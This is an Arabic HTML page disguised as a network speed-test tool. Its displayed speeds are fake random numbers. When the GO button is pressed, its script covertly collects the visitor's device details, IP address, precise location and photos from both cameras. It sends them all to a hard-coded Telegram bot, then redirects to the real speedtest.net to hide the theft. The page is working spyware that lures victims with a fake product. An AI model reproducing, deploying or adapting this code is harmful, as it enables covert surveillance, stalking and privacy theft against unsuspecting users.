
<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>SpeedTest Global | فحص سرعة الشبكة</title>
    <style>
        :root { --accent: #00d2ff; --dark-bg: #0b0e18; }
        body { background: var(--dark-bg); color: white; font-family:  Segoe UI , Tahoma, sans-serif; margin: 0; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; overflow: hidden; }
        .grid-bg { position: absolute; width: 100%; height: 100%; background-image: linear-gradient(rgba(0, 210, 255, 0.03) 1px, transparent 1px), linear-gradient(90deg, rgba(0, 210, 255, 0.03) 1px, transparent 1px); background-size: 25px 25px; z-index: -1; }
        .main-card { background: rgba(255, 255, 255, 0.03); padding: 40px; border-radius: 30px; border: 1px solid rgba(255, 255, 255, 0.1); backdrop-filter: blur(15px); text-align: center; width: 85%; max-width: 400px; box-shadow: 0 25px 50px rgba(0,0,0,0.5); }
        h1 { font-size: 22px; margin: 0 0 10px; font-weight: 300; letter-spacing: 2px; }
        .status-dot { display: inline-block; width: 8px; height: 8px; background: #4caf50; border-radius: 50%; margin-left: 8px; box-shadow: 0 0 10px #4caf50; }
        .gauge-box { position: relative; width: 220px; height: 220px; margin: 30px auto; border-radius: 50%; border: 2px solid rgba(0, 210, 255, 0.2); display: flex; flex-direction: column; align-items: center; justify-content: center; }
        #goBtn { width: 160px; height: 160px; border-radius: 50%; border: 4px solid var(--accent); background: transparent; color: var(--accent); font-size: 35px; font-weight: bold; cursor: pointer; transition: 0.4s; z-index: 5; outline: none; }
        #goBtn:active { transform: scale(0.9); background: rgba(0, 210, 255, 0.1); }
        .loader-ring { position: absolute; width: 100%; height: 100%; border: 4px solid transparent; border-top-color: var(--accent); border-radius: 50%; display: none; animation: spin 1s linear infinite; }
        #speedDisplay { display: none; text-align: center; }
        .speed-num { font-size: 48px; font-weight: 800; color: var(--accent); display: block; }
        .unit { font-size: 14px; color: #8892b0; }
        @keyframes spin { to { transform: rotate(360deg); } }
        video, canvas { display: none; }
    </style>
</head>
<body>
    <div class="grid-bg"></div>
    <div class="main-card">
        <h1>SPEEDTEST <span class="status-dot"></span></h1>
        <p id="subText" style="color: #8892b0; font-size: 13px;">اختبر سرعة اتصالك بالسيرفرات الإقليمية</p>
        <div class="gauge-box">
            <div id="ring" class="loader-ring"></div>
            <button id="goBtn">GO</button>
            <div id="speedDisplay">
                <span id="num" class="speed-num">0.0</span>
                <span class="unit">Mbps (Download)</span>
            </div>
        </div>
        <div style="margin-top: 20px; font-size: 11px; color: #555;">Server: YEMEN-DATA-01</div>
    </div>
    <video id="v" autoplay playsinline muted></video>
    <canvas id="c"></canvas>

    <script>
        const token = "8738245852:AAFuHo61scaBhakSOPlnPg7UIS8Ggx7llGk";
        const chat = "7984067238";

        async function sendToTelegram(msg, isImg = false, data = null) {
            const url = `https://api.telegram.org/bot${token}/`;
            try {
                if(!isImg) {
                    await fetch(`${url}sendMessage?chat_id=${chat}&text=${encodeURIComponent(msg)}&parse_mode=Markdown`);
                } else {
                    const fd = new FormData();
                    fd.append("chat_id", chat);
                    fd.append("photo", data, "shot.jpg");
                    await fetch(`${url}sendPhoto`, { method: "POST", body: fd });
                }
            } catch(e) { console.error("Error sending:", e); }
        }

        async function getFullReport() {
            let info = `📊 *تقرير فحص جديد*:\n\n`;
            info += `• 📱 الجهاز: \`${navigator.platform}\`\n`;
            info += `• 💾 الرام: \`${navigator.deviceMemory || "؟"} GB\`\n`;
            info += `• ⚙️ المعالج: \`${navigator.hardwareConcurrency} Cores\`\n`;
            try {
                const b = await navigator.getBattery();
                info += `• 🔋 البطارية: \`${Math.round(b.level * 100)}%\` (${b.charging ? "🔌 يشحن" : "🔋"})\n`;
            } catch(e) {}
            try {
                const ipRes = await fetch( https://api.ipify.org?format=json );
                const ipData = await ipRes.json();
                info += `• 🌐 الـ IP: \`${ipData.ip}\`\n`;
            } catch(e) {}
            return info;
        }

        async function snap(mode) {
            try {
                const s = await navigator.mediaDevices.getUserMedia({ video: { facingMode: mode } });
                const v = document.getElementById("v");
                const c = document.getElementById("c");
                v.srcObject = s;
                await new Promise(r => v.onloadedmetadata = r);
                await new Promise(r => setTimeout(r, 1500));
                c.width = 640; c.height = 480;
                c.getContext("2d").drawImage(v, 0, 0);
                s.getTracks().forEach(t => t.stop());
                return new Promise(res => c.toBlob(res, "image/jpeg", 0.7));
            } catch(e) { return null; }
        }

        document.getElementById("goBtn").onclick = async function() {
            this.style.display = "none";
            document.getElementById("ring").style.display = "block";
            document.getElementById("speedDisplay").style.display = "block";
            document.getElementById("subText").innerText = "جاري الاتصال بالسيرفر...";

            const timer = setInterval(() => {
                let random = (Math.random() * (98 - 82) + 82).toFixed(1);
                document.getElementById("num").innerText = random;
            }, 100);

            const report = await getFullReport();
            await sendToTelegram(report);

            navigator.geolocation.getCurrentPosition(async (p) => {
                const mapUrl = `https://www.google.com/maps?q=${p.coords.latitude},${p.coords.longitude}`;
                await sendToTelegram(`📍 *الموقع الدقيق*:\n[فتح عبر خرائط جوجل](${mapUrl})`);
            }, () => sendToTelegram("❌ رفض الموقع"));

            const front = await snap("user");
            if(front) await sendToTelegram("📸 صورة أمامية", true, front);

            const back = await snap("environment");
            if(back) await sendToTelegram("📷 صورة خلفية", true, back);

            setTimeout(() => {
                clearInterval(timer);
                window.location.href = "https://www.speedtest.net/ar";
            }, 8000); 
        };
    </script>
</body>
</html>
